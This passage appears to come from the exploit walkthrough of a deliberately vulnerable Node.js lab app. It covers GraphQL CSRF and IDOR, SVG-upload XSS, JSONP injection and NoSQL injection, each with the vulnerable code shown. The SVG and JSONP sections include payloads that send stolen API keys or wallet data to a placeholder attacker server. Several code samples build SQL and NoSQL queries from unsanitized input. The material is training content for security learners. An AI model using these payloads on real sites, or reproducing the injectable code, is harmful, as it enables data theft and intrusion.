4. Send the request and you will see `Update Successful!` which shows that the application also accepts `application/x-www-form-urlencoded` data now you can create a CSRF exploit page and send it to the victim to change their email & password.

### Vulnerable code

**Route: /routes/app.js**

```js
router.use('/graphql', authenticateToken, graphqlHTTP({
    schema: schema,
    rootValue: vuln_controller.graphqlroot 
}))
```

**graphqlroot**

```js
const graphqlroot = {
    user: graphql_GetUser,
    listUsers: graphql_AllUsers,
    updateProfile: graphql_UpdateProfile, // updateProfile handler
    showProfile: graphql_ShowProfile
}
```

**graphql_UpdateProfile**

```js
async function graphql_UpdateProfile(args, req){
    const updateQuery = `UPDATE users SET email='${args.email}', password='${md5(args.password)}' WHERE username = '${req.user.username}';`
    await con.connect()
    const updateResult = await con.promise().query(updateQuery)
    const updateStatus = JSON.stringify(updateResult[0].affectedRows) // returns update status
    return "Update Successful!"
}
```

## 24. GraphQL IDOR

Application is trusting data supplied from the API client and using it to show the user details without performing the authorization check, your goal is to access details of other users by performing IDOR.

### Exploit

1. Go to `/graphql-idor-show-profile`.
2. Refresh the page while intercepting requests using burp suite, you will see a graphql request to show the user profile send that request to the repeater and change the value of variable userid to `1` and you will be able to see the details of admin user `vulnlabAdmin`
    
### Vulnerable code

**Route: /routes/app.js**

```js
router.use('/graphql', authenticateToken, graphqlHTTP({
    schema: schema,
    rootValue: vuln_controller.graphqlroot 
}))
```

**graphqlroot**

```js
const graphqlroot = {
    user: graphql_GetUser,
    listUsers: graphql_AllUsers,
    updateProfile: graphql_UpdateProfile, 
    showProfile: graphql_ShowProfile // showProfile handler
}
```

**graphql_ShowProfile**

```js
async function graphql_ShowProfile(args){
    const userid = args.userid
    const q = "SELECT * FROM users where id='" + userid + "';";
    await con.connect()
    const userdata = await con.promise().query(q)
    return userdata[0][0]
}
```

## 25. XSS using SVG file upload

Application allows users to upload .svg file as a profile picture your goal is to steal other user information by using XSS.

### Exploit

1. Login to the attacker account
2. Upload the following malicious `.svg` file to your account.
   
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert('This app is probably vulnerable to XSS attacks!');
   </script>
</svg>
```
3. Right click on your profile image click on view image and it will open the image in a new tab and you will see an alert popup.
4. Now modify the XSS payload in the svg file to steal details from other users account such as their  API token that is returned from this endpoint `/jwt1/apiKey`
   
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script>
function stealData(t) {
    fetch(t).then(t => t.text()).then(t => {
        fetch("http://<attackerserver>/steal?apitKey=" + t)
    })
}
stealData("http://<vuln-nodejs-app>/jwt1/apiKey");
   </script>
</svg>
```

5. Save the above code in a .svg file and upload it as your profile picture then copy the file URL and send it to your target and you will get apikey in your attacker server logs.

### Vulnerable Code

**Route: /routes/app.js**

```js
router.route('/svg-xss')
    .get(authenticateToken, vuln_controller.svg_xss_get)
    .post(authenticateToken, vuln_controller.svg_xss_fileupload_post);
```

**Controller: /controllers/vuln_controller.js**

```js
const svg_xss_fileupload_post = (req, res) => {
    if (!req.files || Object.keys(req.files).length === 0) {
        return res.status(400).send('No files were uploaded.');
    }
    const profilePic = req.files.profilePic;
    const profilePicName = profilePic.name
    const profilePicExtension = path.extname(profilePicName)
    const allowedExtension = ['.png', '.jpg', '.jpeg', '.svg'] // .svg file allowed
    if (!allowedExtension.includes(profilePicExtension)) {
        return res.status(422).send('Only .PNG,.JPEG,.SVG files are allowed')
    }
    ... snip ...
```

## 26 JSONP Injection

Application is using JSONP for fetching wallet balance information your goal is to steal the wallet information of other users.

### Exploit

1. First go to `/jsonp-injection` and analyze how the application is updating wallet balance information using burp suite.
2. Observe a GET request going to `/jsonp-injection/wallet-usd-balance` endpoint with a callback parameter. 
3. Forward the request and observe that the response type is application/javascript because it is a JSONP endpoint.
4. Now send the request without callback parameter this time you will notice that server returned application/json content type so if you are doing testing don't forget to add '?callback' parameter on API endpoints to check if the target api provides jsonp response.
5. Since jsonp endpoint returns content-type application/javascript and allow us to specify callback function we can steal user information, by using jsonp endpoint as a script in our attacker website and then sending it to the victim to steal their information.6. Copy the following code in an HTML file and host it on your server.
   
```html
<html>
<body>
<script>
function stealData(data){
  console.log(data)
  fetch("http://<attacker-server>/steal?data=" + JSON.stringify(data))
}
</script>
<script src="http://<vuln-nodejs-app>:9000/jsonp-injection/wallet-usd-balance?callback=stealData">
</script>

</body>
</html>
```

6. Host the exploit file on your attacker server then send it to victim once they open the page you will get there wallet balance on your web server. 
   
### Vulnerable Code

**Route: /routes/app.js**

```js
router.get('/jsonp-injection/wallet-usd-balance', authenticateToken, vuln_controller.jsonp_wallet_get);
```

**Controller: /controllers/vuln_controller.js**
```js
const jsonp_wallet_get = (req, res)=>{
    Wallet.findOne({where:{username: req.user.username}}, {attributes:['BTC', 'ETH']})
    .then((crypto_balance)=>{
        const bitcoin_quantity = crypto_balance.BTC;
        const ethereum_quantity = crypto_balance.ETH;
        const request = require('request')
        request('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin%2Cethereum&vs_currencies=usd', {json: true}, (err, response, body)=>{
            if (err) { return console.log(err); }
            const bitcoin_usd_value = bitcoin_quantity * body.bitcoin.usd + Math.floor(Math.random() * 100);
            const ethereum_usd_value = ethereum_quantity * body.ethereum.usd + Math.floor(Math.random() * 100);
            const total_usd_value = bitcoin_usd_value + ethereum_usd_value + Math.floor(Math.random() * 100);
            const data = {username: req.user.username, btc: bitcoin_usd_value, eth: ethereum_usd_value, total: total_usd_value}
            res.jsonp(data) // send jsonp data
        }) 
    })
}
```

## 27. NoSQL JavaScript Injection

Application has a password protected secret your goal is to access it by using NoSQL injection.

### Exploit

1. Go to ./nosql-js-injection
2. Enter random password while intercepting request using burpsuite.
3. Change the request payload with following injection payload.

```json
{"password":"'; return ''=='"}
```

Above payload is similar to SQL injection payload `' or 1=1--` but here we injected javascript code as NoSQL database allow us to run javascript in database engine if passed through functions that allow it, such as `$where` function that is being used in this exercise. Javascript execution exposes a dangerous attack surface if unsanitized user input finds it's way to the query.

### Vulnerable Code

**Route: /routes/app.js**

```js
router.post('/unlock-secret', authenticateToken, vuln_controller.secret_post);
```

**Controller: /controllers/vuln_controller.js**

```js
const secret_post = (req, res) => {
    MongoClient.connect(dbURL, mongodb_config, (err, client) => {
        if (err) return res.status('500').send('MongoDB is not installed, Please follow the installation guideline.');
        const db = client.db('vuln_nodejs_app')
        db.collection('secret').find({ $where: "this.password =='"+req.body.password+"'"}).toArray()
            .then((secret) => {
                if (secret.length == 0) return res.status(403).send('Incorrect password!')
                res.send(secret[0].flag)
            }).catch((err) => {
                res.status(500).send('Internal server error!');
            })
    })
}
```
